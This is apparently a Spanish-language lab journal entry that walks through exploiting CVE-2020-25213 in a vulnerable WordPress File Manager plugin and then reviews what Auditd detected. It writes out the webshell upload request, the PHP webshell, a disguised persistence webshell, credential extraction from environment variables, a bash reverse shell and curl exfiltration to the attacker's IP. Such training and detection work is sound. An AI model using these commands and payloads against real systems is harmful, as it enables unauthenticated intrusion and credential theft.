# Día 5 - Ubuntu: WordPress Plugin RCE (CVE-2020-25213)

Operación Eslabón, 28 de junio de 2026.

## Objetivo

Ejecutar una cadena completa de ataque contra un WordPress con el plugin File Manager versión 6.0 vulnerable a ejecución remota de código sin autenticación (CVE-2020-25213). Adicionalmente, analizar qué registró Auditd durante el ataque desde la perspectiva Blue Team.

## Máquinas

Víctima: Ubuntu (192.168.1.96), WordPress en Docker puerto 9000
Atacante: Kali Linux (192.168.1.132)
Blue Team: Auditd activo en el host Ubuntu

## Entorno

WordPress 7.0 corriendo en contenedor Docker con MySQL en contenedor separado (wp-db). Plugin wp-file-manager 6.0 instalado manualmente (versión vulnerable, la versión actual 8.0.4 está parchada).

## Desarrollo

### Fase 1: Reconnaissance (T1595)

Se ejecutó nmap para identificar servicios:

```
nmap -sV -p 9000 192.168.1.96
→ Apache httpd 2.4.67 (Debian)
```

Se inspeccionaron los headers HTTP:

```
curl -sI http://192.168.1.96:9000
→ Server: Apache/2.4.67 (Debian)
→ X-Powered-By: PHP/8.3.31
→ Link: <http://192.168.1.96:9000/wp-json/>; rel="https://api.w.org/"
```

El header `wp-json` confirmó que es WordPress sin necesidad de abrir el navegador.

Se ejecutó WPScan para enumerar plugins:

```
wpscan --url http://192.168.1.96:9000 --enumerate p --plugins-detection aggressive
```

Resultados relevantes:
- WordPress 7.0
- Plugin wp-file-manager versión 6.0 (desactualizado, última versión 8.0.4)
- XML-RPC habilitado
- readme.html público (expone versión)
- wp-cron.php accesible

WPScan identificó el plugin con 100% de confianza leyendo el readme.txt del plugin.

### Fase 2: Initial Access (T1190 — CVE-2020-25213)

El CVE-2020-25213 afecta el archivo `connector.minimal.php` del plugin, que es un conector de la librería elFinder expuesto sin controles de acceso. Permite subir archivos PHP arbitrarios sin autenticación.

Se verificó que el endpoint vulnerable existe:

```
curl -s http://192.168.1.96:9000/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
→ {"error":["errUnknownCmd"]}
```

La respuesta `errUnknownCmd` confirmó que el endpoint está activo.

Se creó una webshell PHP mínima:

```php
<?php system($_GET["cmd"]); ?>
```

Se subió al servidor via el endpoint vulnerable:

```
curl -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@shell.php;type=image/png" \
  http://192.168.1.96:9000/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
```

El servidor aceptó el archivo y devolvió su ubicación:

```
/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php
```

### Fase 3: Execution (T1059.004 — Unix Shell)

Se verificó la ejecución de comandos:

```
curl "http://192.168.1.96:9000/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmado como usuario www-data.

### Fase 4: Discovery (T1082, T1057, T1033)

```
uname -a
→ Linux 62e31b075889 6.17.0-35-generic — contenedor Docker confirmado

cat /etc/passwd
→ Solo usuarios de sistema: root, www-data, nobody
→ Sin usuarios reales, entorno minimalista de contenedor

ps aux
→ Solo procesos Apache corriendo como www-data
→ Root lanzó Apache, workers son www-data
```

Hallazgos: sistema contenedorizado, sin usuarios interactivos, sin herramientas de desarrollo instaladas.

### Fase 5: Credential Access (T1552 — Unsecured Credentials)

Se leyó el archivo wp-config.php:

```
cat /var/www/html/wp-config.php
→ Las credenciales usan variables de entorno Docker (getenv_docker)
→ No están hardcodeadas en el archivo
```

Se extrajeron las variables de entorno del proceso:

```
strings /proc/self/environ
→ WORDPRESS_DB_PASSWORD=wp123
→ WORDPRESS_DB_USER=wp
→ WORDPRESS_DB_HOST=wp-db
→ WORDPRESS_DB_NAME=wordpress
```

Se conectó a la base de datos via PHP (no había cliente mysql instalado):

```php
$conn = new mysqli('wp-db', 'wp', 'wp123', 'wordpress');
$result = $conn->query('SELECT user_login, user_pass, user_email FROM wp_users');
```

Credenciales obtenidas:

```
admin | $2y$10$NdmjQiMk7Tj03e6o2L/4vua0mI4vUTz48AxwazlI3aXP9my.DOojC | admin@anclalab.com
```

Hash tipo bcrypt ($2y$10$). Intento de cracking con hashcat -m 3200 contra rockyou.txt: estimado 2 días y 19 horas en CPU. Inviable en tiempo razonable. Documentado como cabo suelto.

### Fase 6: Execution — Reverse Shell (T1059.004)

Se estableció una reverse shell interactiva:

```bash
bash -i >& /dev/tcp/192.168.1.132/4444 0>&1
```

Conexión exitosa desde el contenedor a Kali en el puerto 4444.

### Fase 7: Persistence (T1505.003 — Web Shell)

Crontab no estaba disponible en el contenedor. Se implementó persistencia mediante una segunda webshell en una ubicación diferente:

```
/var/www/html/wp-content/uploads/wp-cache.php
```

El nombre `wp-cache.php` imita archivos legítimos de WordPress para pasar desapercibido. Accesible desde:

```
http://192.168.1.96:9000/wp-content/uploads/wp-cache.php?cmd=id
```

### Fase 8: Collection (T1005)

Se extrajeron usuarios y hashes de la base de datos WordPress via PHP con las credenciales obtenidas previamente.

### Fase 9: Exfiltration (T1041 — Exfiltration Over C2 Channel)

Se levantó un listener en Kali en el puerto 9001 y se exfiltró el hash codificado en base64 via HTTP:

```bash
curl http://192.168.1.132:9001/?data=admin:$(echo '$2y$10$...' | base64 -w0)
```

El listener capturó:

```
GET /?data=admin:JFAkTmRtalFpTWs3VGowM2U2bzJMLzR2dWEwbUk0dlVUejQ4QXh3YXpsSTNhWFA5bXkuRE9vakMK
```

Decodificado confirmó el hash original.

## Técnicas MITRE ATT&CK

T1595 - Reconnaissance: nmap, WPScan, headers HTTP
T1190 - Exploit Public-Facing Application: CVE-2020-25213, wp-file-manager 6.0
T1059.004 - Unix Shell: webshell PHP, reverse bash shell
T1082 - System Information Discovery: uname, /etc/passwd, ps aux
T1033 - System Owner/User Discovery: id, /etc/passwd
T1552 - Unsecured Credentials: /proc/self/environ, wp-config.php, MySQL dump
T1505.003 - Server Software Component: Web Shell: dos webshells persistentes
T1005 - Data from Local System: dump de base de datos WordPress
T1041 - Exfiltration Over C2 Channel: HTTP GET con datos en base64

## Análisis Blue Team (Auditd)

### Qué NO detectó Auditd

Auditd corre en el host Ubuntu y monitorea el filesystem del host. El ataque ocurrió dentro de un contenedor Docker con su propio filesystem aislado. Por esto, Auditd no registró:

- La subida de la webshell
- Los comandos ejecutados via webshell (id, uname, cat, strings)
- La creación de la segunda webshell en uploads
- El acceso a wp-config.php y /proc/self/environ

Conclusión importante: auditd en el host no ve lo que pasa dentro de contenedores Docker a nivel de filesystem.

### Qué SÍ detectó Auditd

La regla `command_execution` capturó syscalls de red del host. Auditd registró múltiples eventos de bash ejecutando conexiones TCP salientes:

```
type=EXECVE: argc=3 a0="bash" a1="-c"
a2=62617368202D69203E26202F6465762F7463702F3139322E3136382E312E3133322F3535353520303E2631
```

Decodificado:

```
bash -i >& /dev/tcp/192.168.1.132/5555 0>&1
```

Este comando apareció repetido cada 60 segundos — firma clara de persistencia automatizada intentando reconectar.

### Firma de detección

Un SOC Analyst vería en los logs:
- Proceso bash ejecutando conexiones TCP salientes repetidas
- Destino consistente: 192.168.1.132:5555
- Patrón cada 60 segundos → persistence automatizada
- Sin TTY, sin sesión de usuario → ejecución en background

En Sentinel o Defender for Endpoint esto generaría: "Suspicious outbound connection from web server process" + "Repeated beaconing behavior detected".

## Cabos sueltos

Cracking de hash bcrypt: estimado 2 días y 19 horas en CPU con rockyou.txt. En escenario real se usaría GPU dedicada o servicio cloud.

Privilege Escalation: no se ejecutó. Como www-data dentro de un contenedor sin SUID binaries ni capabilities especiales, el vector más viable sería escape de contenedor Docker, que está fuera de scope para este día.

Auditd en contenedores: para detectar ataques dentro de contenedores, el enfoque correcto es montar el socket de auditd dentro del contenedor o usar herramientas específicas como Falco (runtime security para Kubernetes/Docker).

## Conclusión

Se completó una cadena de nueve eslabones contra WordPress via CVE-2020-25213. El ataque no requirió autenticación en ningún momento. El análisis Blue Team reveló una limitación importante: auditd en el host no ve el filesystem de los contenedores, pero sí captura syscalls de red, lo que permitió detectar la reverse shell y el patrón de reconexión automática.

Próximo: Día 6 - Windows, Drive-by compromise / HTML smuggling.
